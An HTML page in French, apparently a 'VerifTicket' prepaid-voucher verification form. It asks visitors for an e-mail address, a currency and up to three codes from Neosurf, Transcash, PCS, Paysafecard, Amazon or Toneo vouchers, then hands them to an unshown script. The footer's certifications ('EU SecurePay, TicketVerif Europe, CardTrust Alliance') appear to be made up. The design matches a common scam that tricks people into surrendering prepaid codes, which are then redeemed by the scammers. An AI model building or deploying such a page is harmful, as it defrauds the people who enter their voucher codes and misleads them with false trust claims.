<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Gestion de Tickets</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div class="container">
      <h1 id="titre">Gestion de Tickets</h1>
      <form id="ticketForm">
        <div class="ifosUser">
          <h2>Données D'utilisateur :</h2>
          <div class="form-group">
            <label for="e-mail">E-mail :</label>
            <input
              type="text"
              placeholder="E-mail de reception"
              required
            />
          </div>
          <div class="form-group">
            <label for="devise">Devise</label>
            <select id="devise" required>
              <option value="USD">USD</option>
              <option value="EU">EU</option>
              <option value="GBP">GBP</option>
              <option value="JPY">JPY</option>
              <option value="CHF">CHF</option>
              <option value="CAD">CAD</option>
              <option value="KWD">KWD</option>
            </select>
          </div>
        </div>

        <div class="ticket-group">
          <h2>Ticket 1</h2>
          <div class="form-group">
            <label for="type1">Type de ticket:</label>
            <select id="type1" name="type1">
              <option value="">Sélectionnez un type</option>
              <option value="neosurf">Neosurf</option>
              <option value="transcash">Transcash</option>
              <option value="pcs">PCS</option>
              <option value="paysafe card">Paysafe card</option>
              <option value="amazon">Amazon</option>
              <option value="toneo">Toneo</option>
              <option value="autre">Autre</option>
            </select>
          </div>
          <div class="form-group">
            <label for="code1">Code du ticket:</label>
            <input
              type="text"
              id="code1"
              name="code1"
              placeholder="Entrez le code du ticket"
            />
          </div>
        </div>

        <div class="ticket-group">
          <h2>Ticket 2</h2>
          <div class="form-group">
            <label for="type2">Type de ticket:</label>
            <select id="type2" name="type2">
              <option value="">Sélectionnez un type</option>
              <option value="neosurf">Neosurf</option>
              <option value="transcash">Transcash</option>
              <option value="pcs">PCS</option>
              <option value="paysafe card">Paysafe card</option>
              <option value="amazon">Amazon</option>
              <option value="toneo">Toneo</option>
              <option value="autre">Autre</option>
            </select>
          </div>
          <div class="form-group">
            <label for="code2">Code du ticket:</label>
            <input
              type="text"
              id="code2"
              name="code2"
              placeholder="Entrez le code du ticket"
            />
          </div>
        </div>

        <div class="ticket-group">
          <h2>Ticket 3</h2>
          <div class="form-group">
            <label for="type3">Type de ticket:</label>
            <select id="type3" name="type3">
              <option value="">Sélectionnez un type</option>
              <option value="neosurf">Neosurf</option>
              <option value="transcash">Transcash</option>
              <option value="pcs">PCS</option>
              <option value="paysafe card">Paysafe card</option>
              <option value="amazon">Amazon</option>
              <option value="toneo">Toneo</option>
              <option value="autre">Autre</option>
            </select>
          </div>
          <div class="form-group">
            <label for="code3">Code du ticket:</label>
            <input
              type="text"
              id="code3"
              name="code3"
              placeholder="Entrez le code du ticket"
            />
          </div>
        </div>

        <button type="submit" class="submit-btn">Valider</button>
      </form>
    </div>

    <script src="script.js"></script>

    <footer style="margin-top: 50px; text-align: center; font-size: 14px; color: #ccc;">
      <p>&copy; 2025 VerifTicket. Tous droits réservés.</p>
      <p>Certifié par : EU SecurePay, TicketVerif Europe, CardTrust Alliance</p>
    </footer>

  </body>
</html>
